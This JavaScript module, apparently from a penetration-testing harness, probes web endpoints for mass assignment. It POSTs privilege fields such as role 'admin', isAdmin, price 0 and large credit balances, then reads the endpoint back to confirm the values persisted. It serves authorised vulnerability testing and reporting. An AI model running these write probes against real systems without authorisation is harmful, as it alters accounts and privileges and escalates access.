'use strict';
/**
 * Mass assignment — write a privilege field, then read it back.
 *
 * WHY A SEPARATE ACTIVE PASS
 *   Captured traffic cannot prove persistence. If a POST echoes the role you
 *   sent in the same response, that is an echo, not an escalation — and reporting
 *   it is one of the most common mass-assignment false positives. Proof requires
 *   two requests: one that writes, one that had no knowledge of the injected
 *   value. Only then has anything actually been stored.
 *
 * WHY THE CONTROL MATTERS
 *   Some endpoints echo a field without persisting it, and some persist only
 *   because the request replayed a whole object. So each probe writes under one
 *   identity and reads under a second request carrying none of the injected
 *   fields. If the value only appears in the writing response, it is not stored.
 */

const { makeLead } = require('./leads');

/** Fields a client UI would never send but a server will happily accept. */
const PRIVILEGE_FIELDS = [
  { field: 'role', value: 'admin', kind: 'string' },
  { field: 'isAdmin', value: true, kind: 'bool' },
  { field: 'is_admin', value: true, kind: 'bool' },
  { field: 'admin', value: true, kind: 'bool' },
  { field: 'verified', value: true, kind: 'bool' },
  { field: 'email', value: 'attacker@owned.invalid', kind: 'string' },
  { field: 'price', value: 0, kind: 'number' },
  { field: 'credits', value: 999999, kind: 'number' },
  { field: 'balance', value: 999999, kind: 'number' },
];

/** A unique token, so a later read can only match if it came from our write. */
const TOKEN_PREFIX = 'pentharness-massassign-';

/** Endpoints plausibly exposing a profile/user object we can write to. */
const WRITE_TARGET = /\/(profile|user|account|me|settings|preferences|customer|tenant|org)(?:\/|$|\?)/i;

async function jsonRequest(ctx, url, method, body, headers) {
  const r = await ctx.request.fetch(url, {
    method,
    headers: { 'Content-Type': 'application/json', Accept: 'application/json', ...(headers || {}) },
    data: body == null ? undefined : JSON.stringify(body),
    timeout: 15000,
  });
  let json = null;
  try { json = JSON.parse(await r.text().catch(() => '')); } catch { /* not json */ }
  return { status: r.status(), json };
}

/** Does the response carry our value under any key? Depth-limited, key-agnostic. */
function containsValue(obj, value, depth = 0) {
  if (obj == null || depth > 4) return false;
  if (obj === value) return true;
  if (Array.isArray(obj)) return obj.some((v) => containsValue(v, value, depth + 1));
  if (typeof obj === 'object') {
    for (const v of Object.values(obj)) if (containsValue(v, value, depth + 1)) return true;
  }
  return false;
}

/**
 * Probe one endpoint for mass assignment.
 * @returns {{findings: Array, tested: number}}
 */
async function probe(ctx, endpoint, opts = {}) {
  const findings = [];
  const headers = opts.headers || {};
  let tested = 0;

  if (!WRITE_TARGET.test(endpoint)) return { findings, tested };

  for (const pf of PRIVILEGE_FIELDS) {
    if (opts.maxFields && tested >= opts.maxFields) break;
    // A string token is used when the field is a string, so the read-back match
    // is unambiguous. Non-string fields fall back to their literal value.
    const value = pf.kind === 'string' && !/^0$|^\d+$/.test(String(pf.value))
      ? `${TOKEN_PREFIX}${pf.field}-${opts.nonce || '0'}`
      : pf.value;

    let w;
    try {
      w = await jsonRequest(ctx, endpoint, 'POST', { [pf.field]: value }, headers);
    } catch (e) {
      continue;
    }
    if (w.status < 200 || w.status >= 300) continue;
    tested++;

    // Control: the write response itself. Echo alone proves nothing.
    const echoed = containsValue(w.json, value);

    // Read-back: a second request that never mentions the field. If the value
    // is here, it was stored, and the response is also proof. The verb does not
    // matter for the argument — what matters is that this request carried none
    // of the injected input. Profile endpoints are commonly POST-only, so fall
    // back to an empty POST rather than giving up on the proof.
    const readBacks = [];
    try {
      readBacks.push(await jsonRequest(ctx, endpoint, 'GET', null, headers));
    } catch { /* try POST below */ }
    const r0 = readBacks[0];
    if (!r0 || r0.status === 405 || r0.status === 404 || r0.status === 501 || r0.json == null) {
      try { readBacks.push(await jsonRequest(ctx, endpoint, 'POST', {}, headers)); } catch { /* ignore */ }
    }
    const r = readBacks.find((x) => x && containsValue(x.json, value)) || r0;
    const persisted = !!r && containsValue(r.json, value);

    if (!persisted) {
      if (echoed && opts.onEchoOnly) opts.onEchoOnly(endpoint, pf.field);
      continue;
    }

    findings.push(makeLead({
      cls: 'mass-assignment',
      title: `PROVEN mass assignment: ${pf.field} is accepted from the client and persists`,
      url: endpoint,
      param: pf.field,
      source: 'massassignment',
      severity_hint: /^(role|is_?admin|admin|permissions?|verified)$/i.test(pf.field) ? 'high' : 'medium',
      confidence: 'confirmed',
      evidence:
        `POST with {"${pf.field}": ${JSON.stringify(value)}} returned ${w.status} and the value was ` +
        `${echoed ? 'echoed' : 'accepted'}. A separate follow-up request carrying none of that input ` +
        `still returned ${r.status} with the value present: ` +
        `${JSON.stringify(r.json).slice(0, 240)}. A field the client UI never sends controls server state.`,
      proof_needed: [
        `show the two-request sequence: write ${pf.field}, then re-read without it`,
        'confirm the program does not intend the client to set this field',
      ],
    }));
    // One confirmed field is enough to report the endpoint.
    break;
  }
  return { findings, tested };
}

module.exports = { probe, PRIVILEGE_FIELDS, TOKEN_PREFIX, WRITE_TARGET };